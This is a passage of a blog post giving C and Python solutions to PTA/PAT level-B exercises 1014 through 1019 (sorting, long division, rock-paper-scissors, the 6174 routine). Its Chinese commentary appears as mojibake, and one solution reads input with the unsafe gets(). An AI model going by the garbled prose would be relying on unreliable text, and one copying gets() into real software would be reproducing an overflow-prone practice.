class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">4</span>][<span class="number">61</span>] = &#123;<span class="number">0</span>&#125;, i = <span class="number">0</span>, j = <span class="number">0</span>, count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *day[<span class="number">8</span>] = &#123;<span class="string">" "</span>, <span class="string">"MON"</span>, <span class="string">"TUE"</span>, <span class="string">"WED"</span>, <span class="string">"THU"</span>, <span class="string">"FRI"</span>, <span class="string">"SAT"</span>, <span class="string">"SUN"</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(i &lt; <span class="number">4</span>)</span><br><span class="line">gets(s[i]), i++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; s[i][j] &amp;&amp; s[i+<span class="number">1</span>][j]; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">0</span> &amp;&amp; s[i][j] == s[i+<span class="number">1</span>][j])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(count == <span class="number">0</span> &amp;&amp; s[i][j] &gt;= <span class="number">65</span> &amp;&amp; s[i][j] &lt;= <span class="number">71</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s "</span>, day[s[i][j]<span class="number">-64</span>]);</span><br><span class="line">count++; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(count == <span class="number">1</span> &amp;&amp; (s[i][j] &gt;= <span class="string">'A'</span> &amp;&amp; s[i][j] &lt;= <span class="string">'N'</span> || s[i][j] &gt;= <span class="number">48</span> &amp;&amp; s[i][j] &lt;= <span class="number">57</span>)) </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02d:"</span>, s[i][j] &gt;= <span class="number">48</span> &amp;&amp; s[i][j] &lt;= <span class="number">57</span> ? s[i][j]<span class="number">-48</span> : s[i][j]<span class="number">-55</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(i &gt; <span class="number">1</span> &amp;&amp; s[i][j] == s[i+<span class="number">1</span>][j] &amp;&amp; (s[i][j] &gt;= <span class="number">65</span> &amp;&amp; s[i][j] &lt;= <span class="number">90</span> || s[i][j] &gt;= <span class="number">97</span> &amp;&amp; s[i][j] &lt;= <span class="number">122</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02d\n"</span>, j);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­æœ‰ä¸ªå¹³æ—¶æ²¡æ³¨æ„è¿‡çš„åœ°æ–¹ï¼Œ<code>i &gt; 1 &amp;&amp; s[i][j] == s[i+1][j] &amp;&amp; (s[i][j] &gt;= 65 &amp;&amp; s[i][j] &lt;= 90 || s[i][j] &gt;= 97 &amp;&amp; s[i][j] &lt;= 122))</code>ï¼Œå¯¹äºè¿™åˆ¤æ–­å¼ï¼Œåé¢æœ‰ || å°±ä¸€å®šè¦åŠ ä¸Šæ‹¬å·ï¼Œä¸ç„¶å®ƒæ»¡è¶³äº†ï¼Œåˆ¤æ–­å¼å°±ç›´æ¥æˆç«‹äº†ã€‚ã€‚ã€‚</p><p>æ€»ç»“ï¼šæ³¨æ„é¢˜ç›®éšå«æ¡ä»¶ã€‚</p><h3 id="1015-å¾·æ‰è®º"><a href="#1015-å¾·æ‰è®º" class="headerlink" title="1015 å¾·æ‰è®º"></a>1015 å¾·æ‰è®º</h3><p>è¿™é“é¢˜è‡ªå·±å¼€å§‹åšèµ·æ¥è¿˜æ˜¯æŒºéš¾çš„ï¼Œå…ˆåˆ†ç±»åå†’æ³¡æ’åºï¼Œä½†ä¸€èˆ¬ä¼šæœ‰æµ‹è¯•ç‚¹è¶…è¿‡ï¼Œæœç„¶ã€‚åé¢å°è¯•ä½¿ç”¨Cè¯­è¨€çš„qsort()ï¼ŒæˆåŠŸäº†ï¼Œä»è¿™é“é¢˜ï¼Œå¯¹qsort()ä½¿ç”¨å˜å¾—æ·±å…¥å¾ˆå¤šã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200702165310493.png" alt="image-20200702165310493"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">int</span> d;</span><br><span class="line"><span class="keyword">int</span> c; </span><br><span class="line">&#125;Stu;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> low = <span class="number">0</span>, high = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">(<span class="keyword">const</span> Stu *a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(a-&gt;d &gt;= high &amp;&amp; a-&gt;c &gt;= high)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a-&gt;d &gt;= high &amp;&amp; a-&gt;c &gt;= low)</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a-&gt;d &gt;= low &amp;&amp; a-&gt;c &gt;= low &amp;&amp; a-&gt;d &gt;= a-&gt;c)</span><br><span class="line"><span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a-&gt;d &gt;= low &amp;&amp; a-&gt;c &gt;= low)</span><br><span class="line"><span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line"><span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a, <span class="keyword">const</span> <span class="keyword">void</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Stu *a1 = (Stu *)a, *b1 = (Stu *)b;</span><br><span class="line"><span class="keyword">int</span> sum = a1-&gt;c+a1-&gt;d, sum1 = b1-&gt;c+b1-&gt;d;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(check(a1) == check(b1))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(sum == sum1)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(b1-&gt;d == a1-&gt;d)</span><br><span class="line"><span class="keyword">return</span> a1-&gt;id - b1-&gt;id;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> b1-&gt;d - a1-&gt;d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> sum1-sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> check(a1)-check(b1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, count = <span class="number">0</span>, i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>, &amp;n, &amp;low, &amp;high);</span><br><span class="line">Stu *stu = (Stu *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Stu)*n);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>, &amp;stu[i].id, &amp;stu[i].d, &amp;stu[i].c);</span><br><span class="line">count += stu[i].d &gt;= low &amp;&amp; stu[i].c &gt;= low ? <span class="number">1</span>:<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">qsort(stu, n, <span class="keyword">sizeof</span>(Stu), cmp);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, count);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d %d %d\n"</span>, stu[i].id, stu[i].d, stu[i].c);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“ï¼šè¿™é“é¢˜ä¸»è¦äºŒç‚¹ï¼Œä¸€ï¼šæƒ³åˆ°å…ˆåˆ’åˆ†ç±»ï¼ŒäºŒï¼šå¦‚ä½•ä½¿ç”¨ä¸Šqsort()å‡½æ•°ã€‚</strong></p><h3 id="1017-Aé™¤ä»¥B"><a href="#1017-Aé™¤ä»¥B" class="headerlink" title="1017 Aé™¤ä»¥B"></a>1017 Aé™¤ä»¥B</h3><p>è¿™ä¸ªé¢˜ä½¿ç”¨Cè¯­è¨€æ¥å†™å°±æ˜¯ä¸€ä¸ªå¤§æ•°é™¤æ³•ï¼Œä½¿ç”¨å¹³å¸¸æ‰‹ç®—é™¤æ³•çš„æ€æƒ³ï¼Œä»å¼€å§‹é™¤åˆ°æœ€åã€‚ä½†æ˜¯è¿™ä¸ªé¢˜ä½¿ç”¨pythonæ¥åšçš„è¯å°±åªæ˜¯å‡½æ•°çš„è°ƒç”¨ã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200703085203557.png" alt="image-20200703085203557"></p><p><strong>Cè¯­è¨€ï¼š</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">1001</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, temp = <span class="number">0</span>, ans = <span class="number">0</span>, len = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s %d"</span>, s, &amp;n);</span><br><span class="line">len = <span class="built_in">strlen</span>(s);</span><br><span class="line">ans = (s[<span class="number">0</span>]<span class="number">-48</span>)/n;</span><br><span class="line"><span class="keyword">if</span>(len == <span class="number">1</span> || ans)  <span class="comment">//å¤„ç†æ•°æ®æ˜¯0çš„æƒ…å†µã€‚</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, ans);</span><br><span class="line"></span><br><span class="line">temp = (s[<span class="number">0</span>]<span class="number">-48</span>)%n;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line">ans = (temp*<span class="number">10</span>+s[i]<span class="number">-48</span>)/n;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, ans);</span><br><span class="line">temp = (temp*<span class="number">10</span>+s[i]<span class="number">-48</span>)%n; <span class="comment">//æ¯æ¬¡é™¤åå°±å¾€åæ¨è¿›ã€‚</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %d"</span>, temp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>python:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n = input().split()</span><br><span class="line">q, r = divmod(int(n[<span class="number">0</span>]), int(n[<span class="number">1</span>]))</span><br><span class="line"><span class="keyword">print</span> (str(q)+<span class="string">' '</span>+str(r))</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“ï¼šå¯¹å¤§æ•°é™¤æ³•ä½¿ç”¨æ‰‹ç®—é™¤æ³•çš„ç¬¬ä¸€æ¬¡ç®€å•åº”ç”¨ã€‚</strong></p><h3 id="1018-é”¤å­å‰ªåˆ€å¸ƒ"><a href="#1018-é”¤å­å‰ªåˆ€å¸ƒ" class="headerlink" title="1018 é”¤å­å‰ªåˆ€å¸ƒ"></a>1018 é”¤å­å‰ªåˆ€å¸ƒ</h3><p>æˆ‘å‘ç°åªè¦é¢˜ç›®å†™èµ·æ¥æ¯”è‡ªå·±é¢„æƒ³çš„ä»£ç é‡å¤§ï¼Œæˆ‘å°±ä¼šç„¦èºï¼Œæ„Ÿè§‰é¢˜ç›®ä¸ä¼šæœ‰é‚£ä¹ˆéº»çƒ¦ï¼Œæƒ³å“ªé‡Œå†™çš„ç½—å—¦äº† ï¼Œæ€ä¹ˆè¿™ä¸ªéƒ½ä¸ä¼šä¹‹ç±»ã€‚å¯¼è‡´æœ€åå°±æ˜¯æ›´ä¸æƒ³åšé¢˜äº†ã€‚è¿™ä¸ªé¢˜å°±æ˜¯ä¸ªä¾‹å­ï¼Œå¼€å§‹é¢„æƒ³çš„å¾ˆç®€å•ï¼Œä»£ç ä¹Ÿå°‘ï¼Œä½†è¿™ä¸ªé¢˜ç¡®å®åˆ¤æ–­æœ‰ç‚¹ç¹çï¼Œå°½ç®¡æœ‰ç®€å•çš„å†™æ³•ï¼Œä¹Ÿåœ¨è‡ªå·±èƒ½åŠ›ä¹‹å¤–å§ã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200704154740020.png" alt="image-20200704154740020"></p><p>éº»çƒ¦çš„åœ°æ–¹å°±æ˜¯å›¾ä¸­æ ‡æ³¨çš„åœ°æ–¹ã€‚è‡ªå·±ç”¨çš„å¥½åƒæ˜¯ä¸€ä¸ªç±»ä¼¼å“ˆå¸Œè¡¨çš„ä¸œè¥¿ï¼Œå› ä¸ºæ²¡å­¦è¿‡ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, i = <span class="number">0</span>, <span class="built_in">max</span> = <span class="number">0</span>, max1 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> ch1 = <span class="number">0</span>, ch2 = <span class="number">0</span>, s[<span class="number">4</span>] = &#123;<span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'J'</span>, <span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">0</span>, b = <span class="number">0</span>, c = <span class="number">0</span>, <span class="built_in">map</span>[<span class="number">127</span>] = &#123;<span class="number">0</span>&#125;, map1[<span class="number">127</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">while</span>(i++ &lt; n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%c %c"</span>, &amp;ch1, &amp;ch2);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">if</span>(ch1 == <span class="string">'C'</span> &amp;&amp; ch2 == <span class="string">'J'</span>)</span><br><span class="line">a++, <span class="built_in">map</span>[<span class="string">'C'</span>]++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(ch1 == <span class="string">'C'</span> &amp;&amp; ch2 == <span class="string">'B'</span>)</span><br><span class="line">c++, map1[<span class="string">'B'</span>]++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(ch1 == <span class="string">'B'</span> &amp;&amp; ch2 == <span class="string">'J'</span>)</span><br><span class="line">c++, map1[<span class="string">'J'</span>]++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(ch1 == <span class="string">'B'</span> &amp;&amp; ch2 == <span class="string">'C'</span>)</span><br><span class="line">a++, <span class="built_in">map</span>[<span class="string">'B'</span>]++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(ch1 == <span class="string">'J'</span> &amp;&amp; ch2 == <span class="string">'B'</span>)</span><br><span class="line">a++, <span class="built_in">map</span>[<span class="string">'J'</span>]++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(ch1 == <span class="string">'J'</span> &amp;&amp; ch2 == <span class="string">'C'</span>)</span><br><span class="line">c++, map1[<span class="string">'C'</span>]++;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">b++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d %d %d\n"</span>, a, b, c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d %d %d\n"</span>, c, b, a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; s[i]; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">max</span> = <span class="built_in">map</span>[s[i]] &gt; <span class="built_in">max</span> ? <span class="built_in">map</span>[s[i]]:<span class="built_in">max</span>;</span><br><span class="line">max1 = map1[s[i]] &gt; max1 ? map1[s[i]]:max1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; s[i]; i++)</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">map</span>[s[i]] &gt;= <span class="built_in">max</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c "</span>, s[i]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; s[i]; i++)</span><br><span class="line"><span class="keyword">if</span>(map1[s[i]] &gt;= max1)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, s[i]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€»ç»“ï¼šåšé¢˜å°±ç®—æœ‰ç®€å•è§£æ³•ï¼ŒæŠŠå½“ä¸‹éº»çƒ¦çš„è§£æ³•å†™å®Œå†è¯´ã€‚</p><h3 id="1019-æ•°å­—é»‘æ´"><a href="#1019-æ•°å­—é»‘æ´" class="headerlink" title="1019 æ•°å­—é»‘æ´"></a>1019 æ•°å­—é»‘æ´</h3><p>æ„Ÿè§‰PTAä¹™çº§é¢˜çš„å‘å¥½å¤šã€‚ã€‚ä¸æ³¨æ„çš„è¯åˆæ˜¯å¤§é‡æ—¶é—´æ‰¾é”™ã€‚ã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200705100809222.png" alt="image-20200705100809222"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp1</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a, <span class="keyword">const</span> <span class="keyword">void</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *p = (<span class="keyword">char</span> *)a, *q = (<span class="keyword">char</span> *)b;</span><br><span class="line"><span class="keyword">return</span> *q-*p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp2</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a, <span class="keyword">const</span> <span class="keyword">void</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *p = (<span class="keyword">char</span> *)a, *q = (<span class="keyword">char</span> *)b;</span><br><span class="line"><span class="keyword">return</span> *p-*q;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">re</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">int</span> (*cmp)(<span class="keyword">const</span> <span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">qsort(s, <span class="built_in">strlen</span>(s), <span class="keyword">sizeof</span>(<span class="keyword">char</span>), cmp);</span><br><span class="line"><span class="built_in">sscanf</span>(s, <span class="string">"%d"</span>, &amp;n);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">5</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, n_re = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n), <span class="built_in">sprintf</span>(s, <span class="string">"%04d"</span>, n);</span><br><span class="line">n = re(s, cmp1), n_re = re(s, cmp2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(n-n_re != <span class="number">0</span> &amp;&amp; n-n_re != <span class="number">6174</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%04d - %04d = %04d\n"</span>, n, n_re, n-n_re);</span><br><span class="line"><span class="built_in">sprintf</span>(s, <span class="string">"%04d"</span>, n-n_re);</span><br><span class="line">n = re(s, cmp1), n_re = re(s, cmp2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%04d - %04d = %04d\n"</span>, n, n_re, n-n_re);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€»ç»“ï¼šæ³¨æ„é€†åºä¸€ä¸ªæ•°å­—æ—¶ä»–å‰é¢çš„0ã€‚</p><h3 id="1020-æœˆé¥¼"><a href="#1020-æœˆé¥¼" class="headerlink" title="1020 æœˆé¥¼"></a>1020 